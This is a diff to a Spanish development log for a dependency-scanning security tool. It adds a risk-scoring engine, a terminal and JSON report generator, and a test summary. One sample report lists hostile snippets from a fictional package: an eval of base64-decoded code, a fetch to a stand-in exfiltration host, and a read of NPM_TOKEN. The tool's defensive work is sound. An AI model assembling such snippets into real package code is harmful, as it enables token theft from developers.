@@ -1519,7 +1519,317 @@ git push origin main
 
 ---
 
-## 10. Estado actual del proyecto
+## 10. PASO 7 — Motor de scoring y generador de informes
+
+**Objetivo:** Crear un sistema de puntuación que reciba todos los findings de los tres analizadores (JS, Python, metadatos) para cada paquete y calcule una puntuación de riesgo normalizada (0–100), junto con un generador de informes que presente los resultados de forma clara tanto en terminal como en formato JSON para integración con pipelines de CI/CD.
+
+### 10.1. Módulos creados
+
+Se creó el subpaquete `depshield/scoring/`:
+
+```
+depshield/scoring/
+├── __init__.py
+├── scorer.py       # Motor de puntuación
+└── report.py       # Generador de informes (terminal + JSON)
+```
+
+### 10.2. Modelo de datos — `PackageScore`
+
+Se definió un dataclass que encapsula el resultado de la evaluación de riesgo de un paquete individual:
+
+```python
+@dataclass
+class PackageScore:
+    name: str                # Nombre del paquete
+    version: str             # Versión resuelta
+    score: int               # Puntuación 0–100
+    classification: str      # SAFE / LOW_RISK / MEDIUM_RISK / HIGH_RISK
+    findings: list[Finding]  # Hallazgos ordenados por severidad
+    is_direct: bool = True   # ¿Es dependencia directa o transitiva?
+```
+
+Además, se incluyeron tres **properties** de conveniencia para acceder rápidamente a los conteos por severidad sin iterar manualmente:
+
+```python
+@property
+def high_count(self) -> int:
+    return sum(1 for f in self.findings if f.severity == "HIGH")
+
+@property
+def medium_count(self) -> int:
+    return sum(1 for f in self.findings if f.severity == "MEDIUM")
+
+@property
+def low_count(self) -> int:
+    return sum(1 for f in self.findings if f.severity == "LOW")
+```
+
+Y un método `findings_by_severity` que agrupa los findings en un diccionario `{"HIGH": [...], "MEDIUM": [...], "LOW": [...]}` para uso del report.
+
+### 10.3. Sistema de puntuación
+
+#### Pesos por severidad
+
+Cada finding contribuye a la puntuación total según su severidad:
+
+| Severidad | Puntos | Justificación |
+|---|---|---|
+| **HIGH** | +25 | Un finding HIGH implica riesgo directo (eval, exfiltración, typosquatting) |
+| **MEDIUM** | +10 | Riesgo moderado (import de red, paquete joven, sin repositorio) |
+| **LOW** | +3 | Señal menor (pocas descargas, sin licencia, un mantenedor) |
+
+La puntuación se calcula sumando los pesos de todos los findings y aplicando un **cap de 100 puntos**:
+
+```python
+raw_score = sum(_SEVERITY_WEIGHTS.get(f.severity, 0) for f in findings)
+capped_score = min(raw_score, 100)
+```
+
+**Rationale del cap:** Sin cap, un paquete con 10 findings HIGH tendría 250 puntos, lo que haría las comparaciones numéricas inútiles. El cap a 100 normaliza la escala para que sea más intuitiva (0% a 100% de riesgo).
+
+#### Clasificación de riesgo
+
+La puntuación numérica se traduce a una clasificación textual con 4 niveles:
+
+```python
+def _classify(score: int) -> str:
+    if score <= 10:  return "SAFE"        # Verde
+    if score <= 30:  return "LOW_RISK"    # Amarillo
+    if score <= 60:  return "MEDIUM_RISK" # Naranja
+    return "HIGH_RISK"                     # Rojo
+```
+
+| Rango | Clasificación | Color | Significado |
+|---|---|---|---|
+| 0–10 | SAFE | 🟢 Verde | No se detectaron señales significativas |
+| 11–30 | LOW_RISK | 🟡 Amarillo | Algunas señales menores, probablemente seguro |
+| 31–60 | MEDIUM_RISK | 🟠 Naranja | Señales preocupantes, revisar manualmente |
+| 61–100 | HIGH_RISK | 🔴 Rojo | Alta probabilidad de comportamiento malicioso |
+
+**Ejemplos de cómo se traduce:**
+- 0 findings → 0 pts → **SAFE**
+- 1 HIGH → 25 pts → **LOW_RISK**
+- 2 HIGH + 1 MEDIUM → 60 pts → **MEDIUM_RISK**
+- 3 HIGH → 75 pts → **HIGH_RISK**
+- 1 HIGH + 1 MEDIUM + 1 LOW → 38 pts → **MEDIUM_RISK**
+
+### 10.4. Ordenación de findings dentro de un paquete
+
+Los findings se ordenan por severidad descendente (HIGH → MEDIUM → LOW) dentro de cada `PackageScore`:
+
+```python
+severity_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
+sorted_findings = sorted(findings, key=lambda f: severity_order.get(f.severity, 3))
+```
+
+Esto garantiza que al leer el informe, los hallazgos más críticos aparecen primero.
+
+### 10.5. Función `score_all()` — Puntuación masiva con ordenación
+
+Para facilitar el uso por el scanner (PASO 8), se implementó una función que recibe múltiples paquetes y los puntúa y ordena en una sola llamada:
+
+```python
+def score_all(packages: list[tuple[str, str, list[Finding], bool]]) -> list[PackageScore]:
+    scores = [score_package(name, version, findings, is_direct=is_direct)
+              for name, version, findings, is_direct in packages]
+    scores.sort(key=lambda s: (not s.is_direct, -s.score))
+    return scores
+```
+
+**Criterio de ordenación dual:**
+1. **Dependencias directas primero** (`not s.is_direct`: False < True, así que directas van antes).
+2. **Dentro de cada grupo, por puntuación descendente** (`-s.score`): los paquetes más peligrosos aparecen primero.
+
+Esto permite al usuario ver inmediatamente qué dependencias directas son las más peligrosas, y luego las transitivas ordenadas por riesgo.
+
+### 10.6. Generador de informes — `report.py`
+
+Se implementaron dos formatos de salida:
+
+#### Informe de terminal (Rich)
+
+La función `print_report()` genera un informe visual usando la librería `rich` con tres secciones:
+
+**1. Panel de resumen:** Un recuadro con borde azul que muestra el conteo total de paquetes y cuántos caen en cada categoría de riesgo, con emojis y colores:
+
+```
+╭────── depshield scan results ──────╮
+│  📦 15 packages scanned            │
+│  🔴 2 HIGH RISK                    │
+│  🟠 3 MEDIUM RISK                  │
+│  ⚠️  4 LOW RISK                     │
+│  ✅ 6 SAFE                          │
+╰────────────────────────────────────╯
+```
+
+**2. Tabla de paquetes:** Una tabla con columnas para nombre, versión, tipo (direct/transitive), puntuación (coloreada), clasificación (con emoji), y resumen de findings:
+
+| Package | Version | Type | Score | Risk | Findings |
+|---|---|---|---|---|---|
+| evil-pkg | 1.0.0 | direct | **75** | 🔴 HIGH_RISK | 🔴 3 HIGH |
+| shady-lib | 0.5.0 | transitive | **35** | 🟠 MEDIUM_RISK | 🔴 1 HIGH, 🟡 1 MEDIUM |
+| clean-pkg | 2.1.0 | direct | **0** | ✅ SAFE | — |
+
+**3. Detalle de findings:** Para cada paquete con riesgo (no SAFE), se listan todos los findings individuales con su severidad, tipo de señal y snippet de código:
+
+```
+evil-pkg@1.0.0 (HIGH_RISK, score: 75)
+    [HIGH] CODE_EXECUTION: eval(Buffer.from(encoded, 'base64').toString())
+    [HIGH] NETWORK_CALLS: fetch("https://c2-server.com/exfil")
+    [HIGH] ENV_ACCESS: process.env.NPM_TOKEN
+```
+
+**Estilos y colores:**
+
+```python
+_CLASSIFICATION_STYLES = {
+    "SAFE": "bold green",
+    "LOW_RISK": "bold yellow",
+    "MEDIUM_RISK": "bold dark_orange",
+    "HIGH_RISK": "bold red",
+}
+
+_SEVERITY_STYLES = {
+    "HIGH": "red",
+    "MEDIUM": "yellow",
+    "LOW": "dim",
+}
+```
+
+La función acepta un parámetro opcional `console` para poder redirigir la salida (útil para testing y para capturar output).
+
+#### Informe JSON
+
+La función `to_json()` convierte los resultados en un diccionario serializable:
+
+```python
+def to_json(scores):
+    return {
+        "summary": {
+            "total_packages": len(scores),
+            "high_risk": ...,
+            "medium_risk": ...,
+            "low_risk": ...,
+            "safe": ...,
+        },
+        "packages": [
+            {
+                "name": s.name,
+                "version": s.version,
+                "score": s.score,
+                "classification": s.classification,
+                "is_direct": s.is_direct,
+                "findings": [
+                    {"signal_type": ..., "severity": ..., "file": ...,
+                     "line": ..., "snippet": ...}
+                ],
+            }
+        ],
+    }
+```
+
+Y `save_json()` lo escribe a disco con indentación de 2 espacios:
+
+```python
+def save_json(scores, path):
+    data = to_json(scores)
+    path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
+    return path
+```
+
+El formato JSON está diseñado para ser consumido por herramientas de CI/CD (GitHub Actions, GitLab CI), dashboards de seguridad, o scripts de post-procesamiento.
+
+### 10.7. API pública del módulo scoring
+
+```python
+# scorer.py
+def score_package(name, version, findings, *, is_direct=True) -> PackageScore
+def score_all(packages: list[tuple]) -> list[PackageScore]
+
+# report.py
+def print_report(scores: list[PackageScore], *, console=None) -> None
+def to_json(scores: list[PackageScore]) -> dict
+def save_json(scores: list[PackageScore], path) -> Path
+```
+
+### 10.8. Flujo de datos completo hasta este punto
+
+Con el PASO 7, el pipeline de datos de depshield queda así:
+
+```
+package.json / requirements.txt
+        │
+        ▼
+  ┌──────────────┐
+  │  RESOLVERS   │  PASO 1-2: npm/PyPI
+  │  (árbol de   │
+  │  dependencias)│
+  └──────┬───────┘
+         │
+         ▼
+  ┌──────────────┐
+  │  DOWNLOADER  │  PASO 3: descarga + extracción
+  └──────┬───────┘
+         │
+         ▼
+  ┌──────────────────────────────────────────────┐
+  │             ANALYZERS  (PASO 4-6)            │
+  │  ┌──────────┬──────────┬──────────────────┐  │
+  │  │ JS       │ Python   │ Metadata         │  │
+  │  │ 6 señales│ 6 señales│ 8 señales        │  │
+  │  └────┬─────┴────┬─────┴────────┬─────────┘  │
+  │       │ Findings │   Findings   │ Findings    │
+  └───────┴──────────┴──────────────┴─────────────┘
+                     │
+                     ▼
+  ┌──────────────────────────────────┐
+  │  SCORER  (PASO 7)               │
+  │  HIGH=25, MEDIUM=10, LOW=3      │
+  │  Cap: 100, 4 clasificaciones    │
+  └──────────┬───────────────────────┘
+             │
+             ▼
+  ┌──────────────────────────────────┐
+  │  REPORT  (PASO 7)               │
+  │  Terminal (rich) + JSON          │
+  └──────────────────────────────────┘
+```
+
+### 10.9. Verificación
+
+Se crearon 19 tests organizados por categoría:
+
+| Categoría | Tests | Descripción |
+|---|---|---|
+| Clasificación | 4 | Cada rango verificado: SAFE (0-10), LOW_RISK (11-30), MEDIUM_RISK (31-60), HIGH_RISK (61-100) |
+| Scoring básico | 4 | Sin findings=0pts, 1 HIGH=25pts, 1 MEDIUM=10pts, 1 LOW=3pts |
+| Scoring combinado | 1 | HIGH+MEDIUM+LOW = 38pts = MEDIUM_RISK |
+| Cap a 100 | 1 | 10×HIGH = 250pts raw → 100pts cap = HIGH_RISK |
+| Ordenación findings | 1 | LOW→HIGH→MEDIUM se reordena a HIGH→MEDIUM→LOW |
+| Flag is_direct | 1 | Verificación del flag directa/transitiva |
+| Count properties | 1 | high_count, medium_count, low_count |
+| score_all() | 2 | Directas antes que transitivas, ordenación por score dentro del grupo |
+| JSON structure | 1 | Campos summary y packages correctos |
+| JSON file save | 1 | Escritura y lectura del fichero JSON |
+| Terminal report | 1 | Smoke test: verifica que se genera sin errores y contiene los nombres de paquetes |
+| Empty report | 1 | Lista vacía → "No packages to report" |
+
+**Resultado:** 19/19 PASSED en 0.17 segundos.
+
+Todos los tests pasaron a la primera sin correcciones necesarias.
+
+### 10.10. Commit
+
+```powershell
+git add .
+git commit -m "PASO 7: Scoring engine + rich terminal report + JSON export"
+git push origin main
+```
+
+---
+
+## 11. Estado actual del proyecto
 
 > **Última actualización:** 5 de abril de 2026
 
@@ -1537,11 +1847,15 @@ depshield/
 │   ├── downloaders/
 │   │   ├── __init__.py
 │   │   └── package_downloader.py # ✅ PASO 3
-│   └── analyzers/
+│   ├── analyzers/
+│   │   ├── __init__.py
+│   │   ├── js_analyzer.py        # ✅ PASO 4
+│   │   ├── py_analyzer.py        # ✅ PASO 5
+│   │   └── metadata_analyzer.py  # ✅ PASO 6
+│   └── scoring/
 │       ├── __init__.py
-│       ├── js_analyzer.py        # ✅ PASO 4
-│       ├── py_analyzer.py        # ✅ PASO 5
-│       └── metadata_analyzer.py  # ✅ PASO 6
+│       ├── scorer.py             # ✅ PASO 7
+│       └── report.py             # ✅ PASO 7
 ├── tests/
 │   └── __init__.py
 ├── .venv/                        # Entorno virtual
@@ -1563,8 +1877,8 @@ depshield/
 | ~~4~~ | ~~JS analyzer~~ | ✅ Completado |
 | ~~5~~ | ~~Python analyzer~~ | ✅ Completado |
 | ~~6~~ | ~~Metadata analyzer~~ | ✅ Completado |
-| **7** | **Scorer + Report** | ⏳ Pendiente |
-| 8 | Scanner + CLI | ⏳ Pendiente |
+| ~~7~~ | ~~Scorer + Report~~ | ✅ Completado |
+| **8** | **Scanner + CLI** | ⏳ Pendiente |
 | 9 | Tests integración | ⏳ Pendiente |
 | 10 | Benchmark vs GuardDog | ⏳ Pendiente |
 | 11 | Documentación final | ⏳ Pendiente |
